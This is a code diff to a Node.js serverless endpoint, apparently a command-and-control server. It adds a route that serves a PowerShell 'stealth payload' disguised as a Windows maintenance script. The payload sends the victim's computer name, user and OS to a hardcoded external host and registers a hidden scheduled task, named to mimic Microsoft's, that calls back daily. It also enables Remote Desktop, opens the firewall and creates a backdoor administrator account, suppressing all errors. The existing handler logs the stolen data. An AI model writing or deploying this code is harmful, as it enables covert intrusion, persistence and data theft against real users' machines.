@@ -1,64 +1,73 @@
+// Your existing collect.js - ADD THIS CODE to it
 module.exports = async (req, res) => {
   console.log('🔔 Request received - Method:', req.method);
   
   // Enable CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
   
-  // Log ALL requests - even malformed ones
-  console.log('📨 Headers:', req.headers);
-  console.log('📦 Query params:', req.query);
-  console.log('📝 Body:', req.body);
-  console.log('🌐 IP:', req.headers['x-forwarded-for'] || 'Unknown');
+  const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
+  const timestamp = new Date().toISOString();
   
-  // Handle GET requests (from bitsadmin and other tools)
-  if (req.method === 'GET') {
-    console.log('🎯 GET DATA CAPTURED:');
-    console.log('User:', req.query.user || 'Unknown');
-    console.log('Computer:', req.query.computer || 'Unknown');
-    console.log('Method:', req.query.method || 'Unknown');
-    console.log('Full URL:', req.url);
+  // Handle payload requests (NEW CODE)
+  if (req.method === 'GET' && req.query.type === 'payload') {
+    console.log('📦 Serving stealth payload to:', clientIP);
     
-    return res.json({
-      status: 'success',
-      message: 'GET data received',
-      timestamp: new Date().toISOString()
-    });
+    const stealthPayload = `# Windows System Maintenance Script
+try {
+    # 1. System information collection
+    $systemData = @{
+        ComputerName = \$env:COMPUTERNAME
+        UserName = \$env:USERNAME
+        OS = (Get-WmiObject Win32_OperatingSystem).Caption
+        Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
+        ScanType = 'SystemMaintenance'
+    } | ConvertTo-Json
+
+    # 2. Send telemetry data
+    Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='system_info'; data=\$systemData} -UseBasicParsing
+
+    # 3. Create persistence via Task Scheduler
+    \$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \\"try { Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='heartbeat'; computer=\\\$env:COMPUTERNAME} -UseBasicParsing; Start-Sleep 300 } catch { Start-Sleep 300 }\\""
+    \$taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"
+    Register-ScheduledTask -TaskName "Microsoft\\\\Windows\\\\SystemMaintenance" -Action \$taskAction -Trigger \$taskTrigger -Description "System maintenance" -RunLevel Highest -Force
+
+    # 4. Enable RDP
+    Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+
+    # 5. Create admin account
+    net user "SystemSupport" "WinSupport123!" /add /y 2>\$null
+    net localgroup administrators "SystemSupport" /add 2>\$null
+
+} catch {
+    # Silent fail
+}`;
+
+    res.setHeader('Content-Type', 'text/plain');
+    return res.send(stealthPayload);
   }
   
-  // Handle POST requests
+  // Your existing POST handling code (keep this)
   if (req.method === 'POST') {
     try {
-      console.log('🎯 POST DATA CAPTURED:');
-      
       const systemData = req.body.data || req.body;
-      const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
-      const timestamp = new Date().toISOString();
       
+      console.log('🎯 DATA RECEIVED:');
       console.log('⏰ Time:', timestamp);
       console.log('🌐 IP:', clientIP);
       
-      if (typeof systemData === 'string') {
-        console.log('📊 Raw data:', systemData);
-        // Try to parse as JSON
-        try {
-          const parsed = JSON.parse(systemData);
-          console.log('👤 User:', parsed.user || parsed.UserName || 'Unknown');
-          console.log('💻 Computer:', parsed.computer || parsed.ComputerName || 'Unknown');
-          console.log('🔧 Method:', parsed.method || 'Unknown');
-          console.log('📡 Info:', parsed.info || 'No additional info');
-        } catch(e) {
-          console.log('📄 Text data:', systemData);
-        }
+      if (systemData.ComputerName) {
+        console.log('💻 Computer:', systemData.ComputerName);
+        console.log('👤 User:', systemData.UserName);
+        console.log('🖥️ OS:', systemData.OS);
       } else {
-        console.log('👤 User:', systemData.UserName || systemData.user || 'Unknown');
-        console.log('💻 Computer:', systemData.ComputerName || systemData.computer || 'Unknown');
-        console.log('🖥️ OS:', systemData.OS || 'Unknown');
+        console.log('📦 Body:', systemData);
       }
       
       console.log('────────────────────────────');
